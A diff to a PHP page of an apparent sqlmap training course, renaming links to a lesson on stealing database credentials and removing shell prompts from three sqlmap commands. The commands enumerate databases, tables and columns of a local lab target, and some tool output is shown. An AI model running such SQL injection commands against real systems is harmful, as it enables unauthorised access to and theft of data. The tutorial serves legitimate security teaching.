@@ -15,9 +15,9 @@
     include SHARED_PATH . 'terminal_text.php';
 
     // Tutorial navigation buttons
-    $previous = 'stealing-dbms-usernames-and-passwords.php';
+    $previous = 'steal-dbms-usernames-and-passwords.php';
     $home = 'sqlmap-course-home.php#tutorials';
-    $next = 'stealing-dbms-usernames-and-passwords.php';
+    $next = 'steal-dbms-usernames-and-passwords.php';
     include SHARED_PATH . 'tutorial_navigation.php';
 
     // Table of contents
@@ -52,7 +52,7 @@
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--dbs</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--dbs</mark> --forms --batch --random-agent
 
 [21:54:11] [INFO] fetching database names
 <mark>available databases [6]:</mark>
@@ -88,7 +88,7 @@ kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--dbs</mark> --forms -
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--tables</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--tables</mark> --forms --batch --random-agent
 
 [22:00:07] [INFO] fetching database names
 [22:00:07] [INFO] fetching tables for databases: 'information_schema, math, mysql, performance_schema, sql_injection_labs, template'
@@ -160,7 +160,7 @@ kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--tables</mark> --form
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--columns</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--columns</mark> --forms --batch --random-agent
 
 Database: sql_injection_labs
 Table: product
